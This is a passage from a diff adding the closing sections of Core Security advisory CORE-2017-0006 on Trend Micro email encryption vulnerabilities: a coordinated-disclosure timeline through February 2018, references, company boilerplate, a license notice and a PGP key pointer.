+2018-01-23: Trend Micro answered proposing the publication date to be
+February 7th.
+2018-01-24: Core Security thanked Trend Micro's answer and asked if all
+the vulnerabilities reported in the advisory will be addressed. In
+addition, Core Security asked for CVE-IDs.
+2018-01-24: Trend Micro confirmed all submitted vulnerabilities will be
+addressed and notified Core Security they will send the CVE-IDs when
+have these assigned. In addition, Trend Micro sent its new PGP key.
+2018-01-29: Core Security thanked Trend Micro's confirmation and agreed
+on the proposed release date.
+2018-01-29: Trend Micro answered saying the team found a couple of
+issues during the QA test. Consequently, Trend Micro asked for
+additional time to fix the remaining vulnerabilities and required a
+separated disclosure time.
+2018-01-29: Core Security answered its intention to report all the
+vulnerabilities in just one advisory and asked for a timeline for the fix.
+2018-02-01: Core Security asked for an update on the remaining
+vulnerabilities.
+2018-02-02: Trend Micro sent an update and requested a week extension.
+2018-02-02: Core Security thanked Trend Micro's update and agreed to
+postpone the release.
+2018-02-14: Trend Micro answered saying the remaining vulnerabilities
+will not be addressed in the patch due to its complexity; therefore,
+mitigation steeps will be recommending. Also, Trend Micro proposed
+February 21 as the release date.
+2018-02-14: Core Security thanked Trend Micro's update and agreed on the
+proposed release date.
+2018-02-21: Advisory CORE-2017-0006 published.
+
+9. *References*
+
+[1]
+http://apac.trendmicro.com/apac/enterprise/network-web-messaging-security/email-encryption/
+
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security, is charged with
+anticipating the future needs and requirements for information security
+technologies.
+We conduct our research in several important areas of computer security
+including system vulnerabilities, cyber attack planning and simulation,
+source code auditing, and cryptography. Our results include problem
+formalization, identification of vulnerabilities, novel solutions and
+prototypes for new technologies. CoreLabs regularly publishes security
+advisories, technical papers, project information and shared software
+tools for public use at:
+http://corelabs.coresecurity.com.
+
+11. *About Core Security*
+
+Core Security provides companies with the security insight they need to
+know who, how, and what is vulnerable in their organization. The
+company's threat-aware, identity & access, network security, and
+vulnerability management solutions provide actionable insight and context
+needed to manage security risks across the enterprise. This shared
+insight gives customers a comprehensive view of their security posture
+to make better security remediation decisions. Better insight allows
+organizations to prioritize their efforts to protect critical assets,
+take action sooner to mitigate access risk, and react faster if a breach
+does occur.
+
+Core Security is headquartered in the USA with offices and operations in
+South America, Europe, Middle East and Asia. To learn more, contact Core
+Security at (678) 304-4500 or info@coresecurity.com
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2018 Core Security and
+(c) 2018 CoreLabs,and are licensed under a Creative Commons Attribution
+Non-Commercial Share-Alike 3.0 (United States) License:
+http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+13. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security advisories
+team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
